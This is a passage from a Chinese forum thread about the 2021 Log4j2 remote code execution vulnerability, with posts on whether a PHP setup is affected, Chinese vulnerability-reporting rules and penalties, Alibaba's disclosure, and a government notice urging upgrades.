<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53966114&amp;ptid=2041735" target="_blank">坏掉了 发表于 2021-12-16 23:00</a>
搭车问一下，

我单位内网主页时用phpstudy自带的apache和mysql做服务，上级发紧急文要查Log4j漏洞，请问我 ...</blockquote>
log4j是Java上面用的

— from OPPO PEGM00, Android 11 of [S1 Next Goose](https://pan.baidu.com/s/1mi43uRm) v2.5.2

*****

####  super_uni  
##### 111#       发表于 2021-12-16 23:12

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53964995&amp;ptid=2041735" target="_blank">ninini212 发表于 2021-12-16 21:19</a>
不要尬黑，阿里第一时间报给宗主国了嗷

全球数亿台设备可能面临新发现的软件漏洞，拜登政府高级网 ...</blockquote>
草台论再创新高，核心的东西就三个人兼职维护，出了问题全世界鸡飞狗跳，早干嘛去了<img src="https://static.saraba1st.com/image/smiley/face2017/065.png" referrerpolicy="no-referrer">

— from OPPO PEGM00, Android 11 of [S1 Next Goose](https://pan.baidu.com/s/1mi43uRm) v2.5.2

*****

####  char1st  
##### 112#       发表于 2021-12-16 23:15

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53966114&amp;ptid=2041735" target="_blank">坏掉了 发表于 2021-12-16 23:00</a>

搭车问一下，

我单位内网主页时用phpstudy自带的apache和mysql做服务，上级发紧急文要查Log4j漏洞，请问我 ...</blockquote>
phpstudy 这个东西问题更大吧。



*****

####  adonai  
##### 113#       发表于 2021-12-16 23:31

虽然看不懂，但好像发生了什么不得了的大事<img src="https://static.saraba1st.com/image/smiley/face2017/067.png" referrerpolicy="no-referrer">

*****

####  yikaa  
##### 114#       发表于 2021-12-16 23:35

搜了一下 没想到还是有法可依的

网络产品安全漏洞管理规定

第六条 鼓励相关组织和个人向网络产品提供者通报其产品存在的安全漏洞。

第七条 网络产品提供者应当履行下列网络产品安全漏洞管理义务，确保其产品安全漏洞得到及时修补和合理发布，并指导支持产品用户采取防范措施：

（一）发现或者获知所提供网络产品存在安全漏洞后，应当立即采取措施并组织对安全漏洞进行验证，评估安全漏洞的危害程度和影响范围；对属于其上游产品或者组件存在的安全漏洞，应当立即通知相关产品提供者。

（二）应当在2日内向工业和信息化部网络安全威胁和漏洞信息共享平台报送相关漏洞信息。报送内容应当包括存在网络产品安全漏洞的产品名称、型号、版本以及漏洞的技术特点、危害和影响范围等。

*****

####  beta10  
##### 115#       发表于 2021-12-16 23:44

<blockquote><a href="httphttps://bbs.saraba1st.com/2b/forum.php?mod=redirect&amp;goto=findpost&amp;pid=53966499&amp;ptid=2041735" target="_blank">yikaa 发表于 2021-12-16 23:35</a>

搜了一下 没想到还是有法可依的

网络产品安全漏洞管理规定</blockquote>
你该引这个

第六十条　违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：

　　（一）设置恶意程序的；

　　（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；

　　（三）擅自终止为其产品、服务提供安全维护的。

网络安全法规定的处罚太轻了，对阿里这种企业来说……



*****

####  beta10  
##### 116#       发表于 2021-12-19 12:05

补个后续的报道吧

——————————————————————————————————————

《关于阿帕奇Log4j2组件重大安全漏洞的网络安全风险提示》

       阿帕奇（Apache）Log4j2组件是基于Java语言的开源日志框架，被广泛用于业务系统开发。近日，阿里云计算有限公司发现阿帕奇Log4j2组件存在远程代码执行漏洞，并将漏洞情况告知阿帕奇软件基金会。

       12月9日，工业和信息化部网络安全威胁和漏洞信息共享平台收到有关网络安全专业机构报告，阿帕奇Log4j2组件存在严重安全漏洞。工业和信息化部立即组织有关网络安全专业机构开展漏洞风险分析，召集阿里云、网络安全企业、网络安全专业机构等开展研判，通报督促阿帕奇软件基金会及时修补该漏洞，向行业单位进行风险预警。

       该漏洞可能导致设备远程受控，进而引发敏感信息窃取、设备服务中断等严重危害，属于高危漏洞。为降低网络安全风险，提醒有关单位和公众密切关注阿帕奇Log4j2组件漏洞补丁发布，排查自有相关系统阿帕奇Log4j2组件使用情况，及时升级组件版本。

       工业和信息化部网络安全管理局将持续组织开展漏洞处置工作，防范网络产品安全漏洞风险，维护公共互联网网络安全。

来源：[https://mp.weixin.qq.com/s/QFbMmbjDpWM1sPqIKls3fQ](https://mp.weixin.qq.com/s/QFbMmbjDpWM1sPqIKls3fQ)



*****

####  mwj  
##### 117#       发表于 2021-12-19 12:24

这漏洞最神奇的是这么久才有人发现？复现起来有手就行啊？log4j2有10年历史了吧。

